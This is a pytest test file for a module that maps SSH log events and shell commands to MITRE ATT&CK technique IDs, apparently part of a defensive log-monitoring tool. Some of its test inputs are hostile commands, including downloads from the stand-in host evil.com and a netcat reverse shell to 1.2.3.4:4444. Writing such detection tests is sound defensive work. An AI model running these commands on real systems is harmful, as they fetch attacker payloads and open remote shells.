"""Tests for src/mitre.py"""

import pytest

from mitre import map_event, map_command, MITRE_MAP, SUSPICIOUS_COMMANDS


class TestMapEvent:
    def test_failed_login(self):
        mid, name = map_event('Failed Login')
        assert mid == 'T1110'
        assert 'Brute Force' in name

    def test_invalid_user(self):
        mid, name = map_event('Invalid User')
        assert mid == 'T1110.001'

    def test_auth_failure(self):
        mid, _ = map_event('Auth Failure')
        assert mid == 'T1110'

    def test_accepted_password(self):
        mid, name = map_event('Accepted Password')
        assert mid == 'T1078'
        assert 'Valid Accounts' in name

    def test_accepted_publickey(self):
        mid, name = map_event('Accepted Publickey')
        assert mid == 'T1078'

    def test_session_opened(self):
        mid, name = map_event('Session Opened')
        assert mid == 'T1021.004'
        assert 'SSH' in name

    def test_sudo_command(self):
        mid, name = map_event('Sudo Command')
        assert mid == 'T1548.003'
        assert 'Sudo' in name

    def test_session_closed_returns_none(self):
        mid, name = map_event('Session Closed')
        assert mid is None
        assert name is None

    def test_connection_closed_returns_none(self):
        mid, _ = map_event('Connection Closed')
        assert mid is None

    def test_disconnected_returns_none(self):
        mid, _ = map_event('Disconnected')
        assert mid is None

    def test_unknown_event_returns_none(self):
        mid, name = map_event('SomeUnknownEvent')
        assert mid is None
        assert name is None

    def test_all_known_types_return_tuples(self):
        for event_type in MITRE_MAP:
            result = map_event(event_type)
            assert isinstance(result, tuple)
            assert len(result) == 2


class TestMapCommand:
    def test_wget(self):
        mid, name = map_command('wget http://evil.com/payload')
        assert mid == 'T1105'

    def test_curl(self):
        mid, name = map_command('curl -O http://evil.com')
        assert mid == 'T1105'

    def test_chmod(self):
        mid, name = map_command('chmod +x /tmp/evil.sh')
        assert mid == 'T1222'

    def test_nc(self):
        mid, _ = map_command('nc -e /bin/sh 1.2.3.4 4444')
        assert mid == 'T1059'

    def test_python(self):
        mid, _ = map_command('python -c "import socket..."')
        assert mid == 'T1059.006'

    def test_python3(self):
        mid, _ = map_command('python3 exploit.py')
        assert mid == 'T1059.006'

    def test_bash(self):
        mid, name = map_command('bash -i')
        assert mid == 'T1059.004'

    def test_whoami(self):
        mid, name = map_command('whoami')
        assert mid == 'T1033'

    def test_crontab(self):
        mid, name = map_command('crontab -e')
        assert mid == 'T1053.003'

    def test_full_path_stripped(self):
        mid, _ = map_command('/usr/bin/wget http://evil.com')
        assert mid == 'T1105'

    def test_unknown_command(self):
        mid, name = map_command('ls -la /tmp')
        assert mid is None
        assert name is None

    def test_empty_string(self):
        mid, name = map_command('')
        assert mid is None

    def test_whitespace_only(self):
        mid, name = map_command('   ')
        assert mid is None
